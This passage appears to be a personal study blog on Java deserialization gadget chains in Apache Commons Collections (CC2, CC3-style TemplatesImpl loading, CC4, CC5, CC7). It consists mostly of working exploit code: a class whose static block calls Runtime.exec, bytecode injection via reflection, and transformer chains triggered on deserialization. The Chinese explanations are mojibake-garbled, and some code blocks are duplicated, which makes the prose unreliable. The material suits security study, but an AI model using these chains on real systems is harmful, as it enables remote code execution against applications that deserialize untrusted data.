<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. æŸ¥æ‰¾ä½¿ç”¨defineClassçš„æ–¹æ³•ï¼ˆclassloaderé‡Œé¢çš„æ˜¯protectedçš„ç±»</span><br><span class="line"></span><br><span class="line">   1. `TemplatesImpl` ç±»çš„ `static class TransletClassLoader` ä¸­æ‰¾åˆ°äº†æˆ‘ä»¬èƒ½å¤Ÿè¿ç”¨çš„ç±»ã€‚</span><br><span class="line">   2. é‡Œé¢æœ‰ä¸ªdefualtçš„ç±»defineclass</span><br><span class="line"></span><br><span class="line">4. è¿½è¸ª</span><br><span class="line"></span><br><span class="line">   1. æ‰¾åˆ°`TemplatesImpl` ç±»çš„defineTransletClasses()</span><br><span class="line">   2. è¿™æ˜¯privateæ–¹æ³•</span><br><span class="line"></span><br><span class="line">5. è¿½è¸ª</span><br><span class="line"></span><br><span class="line">   1. `getTransletInstance()` æ–¹æ³•è°ƒç”¨äº† `defineTransletClasses()` æ–¹æ³•</span><br><span class="line">   2. è¿™ä¸ªæ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œç»§ç»­æ‰¾</span><br><span class="line"></span><br><span class="line">6. è¿½è¸ª</span><br><span class="line"></span><br><span class="line">   1. æœ€åæ‰¾åˆ°publicæ–¹æ³•.newTransformer()</span><br><span class="line"></span><br><span class="line">7. å¼€å¯ç¬¬ä¸€å±‚è°ƒç”¨</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## æ“ä½œ</span><br><span class="line"></span><br><span class="line">### ç¬¬ä¸€å±‚è°ƒç”¨</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
</li>
</ol>
<p>TemplatesImpl templates &#x3D; new TemplatesImpl();<br>templates.newTransformer();<br>&#x2F;&#x2F; å› ä¸ºæ˜¯ä¸€å±‚å±‚è°ƒç”¨çš„ï¼Œæˆ‘ä»¬éœ€è¦åç»­èµ‹å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### ç„¶åå¤„ç†ä¼ å‚</span><br><span class="line"></span><br><span class="line">è¿½è¸ªæ•°æ®å¯ä»¥æŸ¥çœ‹ç±»å‹</span><br><span class="line"></span><br><span class="line">_nameä¸èƒ½ä¸ºnull</span><br><span class="line"></span><br><span class="line">_classåº”è¯¥ä¸ºnull</span><br><span class="line"></span><br><span class="line">ç„¶åè¿½è¸ªdefineTransletClasses()</span><br><span class="line"></span><br><span class="line">_bytecodesä¸èƒ½ä¸ºç©ºï¼Œå¹¶ä¸”ä»–ä¼ è¿›å»çš„æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œåœ¨æ•°ç»„é‡Œé¢ä¼šè¿›è¡Œéå†ä¼ å…¥defineclassï¼Œé‚£ä¹ˆå°±å¥—ä¿©æ•°ç»„</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>byte[] evil &#x3D; Files.readAllBytes(Paths.get(â€œE:&#x2F;&#x2F;Call.classâ€));<br>byte[][] codes &#x3D; {evil};</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">callä»£ç å¦‚ä¸‹</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;<br>import java.io.IOException;<br>public class call {<br>    static {<br>        try {<br>            Runtime.getRuntime().exec(â€œcalcâ€);<br>        } catch (IOException e){<br>            e.printStackTrace();<br>        }<br>    }<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### åŸºç¡€æ¨¡æ¿ä»£ç </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    templates.newTransformer();
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ç„¶åå»ç»“å†³çˆ¶ç±»æŠ¥é”™é—®é¢˜</span><br><span class="line"></span><br><span class="line">### ç»“åˆcc1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(templates),
            new InvokerTransformer(&quot;newTransformer&quot;, null, null)
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //   chainedTransformer.transform(1);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Target.class, transformedMap);
    // åºåˆ—åŒ–ååºåˆ—åŒ–
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;    public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(templates),
            new InvokerTransformer(&quot;newTransformer&quot;, null, null)
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //   chainedTransformer.transform(1);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Target.class, transformedMap);
    // åºåˆ—åŒ–ååºåˆ—åŒ–
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### å®Œæ•´ç‰ˆ</span><br><span class="line"></span><br><span class="line">cc1å’Œcc6ç”¨çš„æ˜¯invoketransformerï¼Œysoç”¨çš„æ˜¯instantiatetransformer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});<br>instantiateTransformer.transform(TrAXFilter.class);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">æœ€ç»ˆå°±æ˜¯</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception &#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates, &quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates, codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);
    instantiateTransformer.transform(TrAXFilter.class);
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## æŠ¥é”™</span><br><span class="line"></span><br><span class="line">çœ‹åˆ°æŠ¥é”™ç›´æ¥ç‚¹ï¼Œç‚¹å®Œå¾€ä¸Šèµ°ç‚¹æ‰“æ–­ç‚¹</span><br><span class="line"></span><br><span class="line">å› ä¸ºä¸Šé¢æœ‰ä¸ªæ£€æµ‹çˆ¶ç±»æ˜¯å¦ä¸ºxxxçš„</span><br><span class="line"></span><br><span class="line">![image-20250126192646191](https://github.com/DDL08/images/blob/img/img/image-20250126192646191.png?raw=true)</span><br><span class="line"></span><br><span class="line">### æ³•ä¸€</span><br><span class="line"></span><br><span class="line">å°†è®¡ç®—å™¨çš„ä»£ç ç»§æ‰¿é‡Œé¢çš„çˆ¶ç±»ï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæŠ½è±¡ç±»çš„æ–¹æ³•é‡å†™ä¸€ä¸‹</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>import com.sun.org.apache.xalan.internal.xsltc.DOM;<br>import com.sun.org.apache.xalan.internal.xsltc.TransletException;<br>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br>import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br>import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</p>
<p>import java.io.IOException;</p>
<p>public class call extends AbstractTranslet {<br>    static {<br>        try {<br>            Runtime.getRuntime().exec(â€œcalcâ€);<br>        } catch (IOException e) {<br>            throw new RuntimeException(e);<br>        }<br>    }<br>    @Override<br>    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {</p>
<pre><code>&#125;
@Override
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;

&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å®Œç¾è§£å†³</span><br><span class="line"></span><br><span class="line">### æ³•äºŒ</span><br><span class="line"></span><br><span class="line">æ¬ ç€</span><br><span class="line"></span><br><span class="line"># CC4é“¾å­</span><br><span class="line"></span><br><span class="line">## åŸç†</span><br><span class="line"></span><br><span class="line">PriorityQueueç±»çš„heapifyæ–¹æ³•ï¼Œè¿½è¸ªè¿›å»-&gt;siftDown-&gt;siftDownUsingComparator,è°ƒç”¨compareæ–¹æ³•</span><br><span class="line"></span><br><span class="line">## ç»“æ„</span><br><span class="line"></span><br><span class="line">### åˆå§‹</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();
    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    //    templates.newTransformer();
    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,
            new Object[]&#123;templates&#125;);
    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(TrAXFilter.class), // æ„é€  setValue çš„å¯æ§å‚æ•°
            instantiateTransformer
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);
    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
    serialize(priorityQueue);

    //unserialize(&quot;ser.bin&quot;);
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">åˆå§‹æ¿å­æ²¡å›åº”</span><br><span class="line"></span><br><span class="line">### å®Œæ•´æ¨¡æ¿</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import org.apache.commons.collections4.Transformer;<br>import org.apache.commons.collections4.comparators.TransformingComparator;<br>import org.apache.commons.collections4.functors.ChainedTransformer;<br>import org.apache.commons.collections4.functors.ConstantTransformer;<br>import org.apache.commons.collections4.functors.InstantiateTransformer;</p>
<p>import javax.xml.transform.Templates;<br>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.PriorityQueue;<br>&#x2F;&#x2F;F:&#x2F;ctf-tool&#x2F;ctf&#x2F;t&#x2F;lz&#x2F;cc&#x2F;c1&#x2F;cc1&#x2F;target&#x2F;classes&#x2F;org&#x2F;example&#x2F;call.class</p>
<p>public class Main{<br>    public static void main(String[] args) throws Exception{<br>        TemplatesImpl templates &#x3D; new TemplatesImpl();<br>        Class templatesClass &#x3D; templates.getClass();<br>        Field nameField &#x3D; templatesClass.getDeclaredField(â€œ_nameâ€);<br>        nameField.setAccessible(true);<br>        nameField.set(templates,â€Drunkbabyâ€);</p>
<pre><code>    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;E://Calc.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());
    //    templates.newTransformer();
    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,
            new Object[]&#123;templates&#125;);
    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(TrAXFilter.class), // æ„é€  setValue çš„å¯æ§å‚æ•°
            instantiateTransformer
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //  instantiateTransformer.transform(TrAXFilter.class);

    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);
    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
    priorityQueue.add(1);
    priorityQueue.add(2);
    serialize(priorityQueue);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### è§£å†³bug</span><br><span class="line"></span><br><span class="line">å…ˆè®© `transformingComparator` çš„å€¼æˆä¸ºä¸€ä¸ªæ— å…³çš„å¯¹è±¡ï¼Œåœ¨ add å®Œä¹‹åå†ç”¨åå°„ä¿®æ”¹ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> Class c &#x3D; transformingComparator.getClass();<br> Field transformingField &#x3D; c.getDeclaredField(â€œtransformerâ€);<br> transformingField.setAccessible(true);<br> transformingField.set(transformingComparator, chainedTransformer);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;  
    TemplatesImpl templates = new TemplatesImpl();  
</code></pre>
<p> Class templatesClass &#x3D; templates.getClass();<br> Field nameField &#x3D; templatesClass.getDeclaredField(â€œ_nameâ€);<br> nameField.setAccessible(true);<br> nameField.set(templates,â€Drunkbabyâ€);  </p>
<p> Field bytecodesField &#x3D; templatesClass.getDeclaredField(â€œ_bytecodesâ€);<br> bytecodesField.setAccessible(true);<br> byte[] evil &#x3D; Files.readAllBytes(Paths.get(â€œE:&#x2F;&#x2F;Calc.classâ€));<br> byte[][] codes &#x3D; {evil};<br> bytecodesField.set(templates,codes);  </p>
<p>&#x2F;&#x2F;        Field tfactoryField &#x3D; templatesClass.getDeclaredField(â€œ_tfactoryâ€);<br>&#x2F;&#x2F;        tfactoryField.setAccessible(true);<br>&#x2F;&#x2F;        tfactoryField.set(templates, new TransformerFactoryImpl());<br>&#x2F;&#x2F;        templates.newTransformer();<br> InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]{Templates.class},<br> new Object[]{templates});<br> Transformer[] transformers &#x3D; new Transformer[]{<br>                new ConstantTransformer(TrAXFilter.class), &#x2F;&#x2F; æ„é€  setValue çš„å¯æ§å‚æ•°<br> instantiateTransformer<br>        };<br> ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);<br> &#x2F;&#x2F;  instantiateTransformer.transform(TrAXFilter.class);  </p>
<p> TransformingComparator transformingComparator &#x3D; new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));<br> PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);<br> priorityQueue.add(1);<br> priorityQueue.add(2);  </p>
<p> Class c &#x3D; transformingComparator.getClass();<br> Field transformingField &#x3D; c.getDeclaredField(â€œtransformerâ€);<br> transformingField.setAccessible(true);<br> transformingField.set(transformingComparator, chainedTransformer);  </p>
<p> serialize(priorityQueue);<br> unserialize(â€œser.binâ€);<br> }<br>    public static void serialize(Object obj) throws IOException {<br>        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(â€œser.binâ€));<br> oos.writeObject(obj);<br> }<br>    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{<br>        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(Filename));<br> Object obj &#x3D; ois.readObject();<br> return obj;<br> }  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC2é“¾å­</span><br><span class="line"></span><br><span class="line">å°±æ˜¯æŠŠCC4çš„InstantiateTransformeræ¢æˆäº† InvokerTransformer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();
    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    InvokerTransformer invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));
    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
    priorityQueue.add(templates);
    priorityQueue.add(templates);

    Class c = transformingComparator.getClass();
    Field transformingField = c.getDeclaredField(&quot;transformer&quot;);
    transformingField.setAccessible(true);
    transformingField.set(transformingComparator, invokerTransformer);
    //serialize(priorityQueue);
    unserialize(&quot;ser3.bin&quot;);
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC5é“¾å­</span><br><span class="line"></span><br><span class="line">ä» `BadAttributeValueExpException` çš„ `readObject()` æ–¹æ³•è¿›æ¥ã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œè°ƒç”¨äº† `toString()` æ–¹æ³•ï¼Œç„¶å `TiedMapEntry` è¿™ä¸ªç±»è°ƒç”¨äº† `toString()` æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">`TiedMapEntry` è¿™ä¸ªç±»çš„ `toString()` æ–¹æ³•è°ƒç”¨äº† `getValue()` æ–¹æ³•ï¼Œåœ¨ `getValue()` æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† `get()` æ–¹æ³•è¢«è°ƒç”¨ï¼Œè¿™å°±å’Œåç»­çš„ `LazyMap.get()` å¯¹åº”èµ·æ¥äº†ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;  
    Transformer[] transformers = new Transformer[]&#123;  
            new ConstantTransformer(Runtime.class), // æ„é€  setValue çš„å¯æ§å‚æ•°  
</code></pre>
<p> new InvokerTransformer(â€œgetMethodâ€,<br> new Class[]{String.class, Class[].class}, new Object[]{â€œgetRuntimeâ€, null}),<br> new InvokerTransformer(â€œinvokeâ€<br> , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br> new InvokerTransformer(â€œexecâ€, new Class[]{String.class}, new Object[]{â€œcalcâ€})<br>        };<br> ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);<br> HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();<br> Map decorateMap &#x3D; LazyMap.decorate(hashMap, chainedTransformer);<br> TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorateMap, â€œvalueâ€);  </p>
<p> BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(null);<br> Class c &#x3D; Class.forName(â€œjavax.management.BadAttributeValueExpExceptionâ€);<br> Field field &#x3D; c.getDeclaredField(â€œvalâ€);<br> field.setAccessible(true);<br> field.set(badAttributeValueExpException, tiedMapEntry);<br> serialize(badAttributeValueExpException);<br> unserialize(â€œser.binâ€);<br> } </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC7é“¾å­</span><br><span class="line"></span><br><span class="line">`Hashtable` çš„å…¥å£ç±» `readObject()` æ–¹æ³•è°ƒç”¨äº†ä¸€ä¸ª `reconstitutionPut()` æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">ç»§ç»­ `reconstitutionPut()` æ–¹æ³•ï¼Œè·Ÿè¿›ä¹‹åæˆ‘ä»¬çœ‹åˆ° `reconstitutionPut()` æ–¹æ³•è°ƒç”¨äº† `equals()` æ–¹æ³•ï¼Œå½“ç„¶å®ƒä¹Ÿè°ƒç”¨äº† `hashCode()` æ–¹æ³•ï¼Œå¦‚æœæ˜¯ `hashCode()` è¿™é‡Œèµ°çš„è¯ï¼Œåˆå›åˆ°æˆ‘ä»¬ CC6 çš„é“¾å­äº†ï¼Œæˆ‘ä»¬ä»Šå¤©ä¸»çœ‹ CC7 çš„ã€‚</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥æ˜¯ `equals()` è¿™ä¸ªæ–¹æ³•ï¼Œå› ä¸ºè¦æ‰¾çš„è¯å®åœ¨æ˜¯å¤ªå¤šäº†ï¼Œç›´æ¥å…¨å±€æœç´¢ï¼Œå®šä½åˆ° `AbstractMapDecorator` è¿™ä¸ªç±»ä¸­ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>
